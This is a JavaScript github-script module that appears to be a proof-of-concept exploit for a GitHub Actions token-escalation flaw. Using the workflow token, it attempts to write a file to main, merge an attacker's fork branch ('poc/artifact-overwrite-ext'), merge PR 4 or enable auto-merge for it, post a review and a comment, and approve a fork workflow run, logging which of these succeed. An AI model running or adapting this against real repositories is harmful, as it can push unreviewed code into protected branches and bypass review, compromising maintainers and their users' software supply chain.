import fs from 'node:fs';
import crypto from 'node:crypto';

const MARK = 'EXT_ESC';

export default async function ({ github, context, core, output }) {
  const ts = Date.now();
  const id = `esc-${context.runId}-${ts}`;
  const log = (...a) => console.log(MARK, id, ...a);
  const R = context.repo;
  const PR = 4;

  const probe = async (name, fn) => {
    try {
      const r = await fn();
      const data = r?.data ?? r;
      log('PROBE', name, 'OK', r?.status ?? '', JSON.stringify(data ?? {}).slice(0, 500));
      return { ok: true, data };
    } catch (e) {
      log('PROBE', name, 'FAIL', e.status ?? '', String(e.message).slice(0, 400));
      return { ok: false, status: e.status };
    }
  };

  // show exactly what the job token can do per advertised scopes
  await probe('pulls.get', () => github.rest.pulls.get({ owner: R.owner, repo: R.repo, pull_number: PR }));

  await probe('contents.createOrUpdateFileContents', () =>
    github.rest.repos.createOrUpdateFileContents({
      owner: R.owner,
      repo: R.repo,
      path: `ext-probe-${ts}.txt`,
      message: 'probe',
      content: Buffer.from('probe').toString('base64'),
      branch: 'main',
    }),
  );

  await probe('repos.merge', () =>
    github.rest.repos.merge({
      owner: R.owner,
      repo: R.repo,
      base: 'main',
      head: 'lazyhacker6:poc/artifact-overwrite-ext',
    }),
  );

  await probe('pulls.updateBranch', () =>
    github.rest.pulls.updateBranch({ owner: R.owner, repo: R.repo, pull_number: PR }),
  );

  await probe('pulls.merge', () =>
    github.rest.pulls.merge({ owner: R.owner, repo: R.repo, pull_number: PR, merge_method: 'merge' }),
  );

  // GraphQL auto-merge attempt (node id lookup + enable)
  const prNode = await probe('graphql.pullRequest', async () => {
    const r = await github.graphql(
      `query($owner:String!,$repo:String!,$n:Int!){repository(owner:$owner,name:$repo){pullRequest(number:$n){id number mergeable mergeStateStatus isCrossRepository}}}`,
      { owner: R.owner, repo: R.repo, n: PR },
    );
    return r.repository.pullRequest;
  });
  if (prNode.ok && prNode.data?.id) {
    await probe('graphql.enablePullRequestAutoMerge', () =>
      github.graphql(
        `mutation($id:ID!,$method:PullRequestMergeMethod!){enablePullRequestAutoMerge(input:{pullRequestId:$id,mergeMethod:$method}){clientMutationId}}`,
        { id: prNode.data.id, method: 'MERGE' },
      ),
    );
  }

  await probe('pulls.createReview', () =>
    github.rest.pulls.createReview({
      owner: R.owner,
      repo: R.repo,
      pull_number: PR,
      event: 'COMMENT',
      body: `EXT_ESC review probe ${id}`,
    }),
  );

  await probe('issues.createComment', () =>
    github.rest.issues.createComment({
      owner: R.owner,
      repo: R.repo,
      issue_number: 5,
      body: `EXT_ESC comment probe ${id}`,
    }),
  );

  await probe('actions.approveRun:forkPRrun', () =>
    github.rest.actions.approveWorkflowRun({
      owner: R.owner,
      repo: R.repo,
      run_id: context.payload?.workflow_run?.id ?? 0,
    }),
  );

  log('DONE');
}
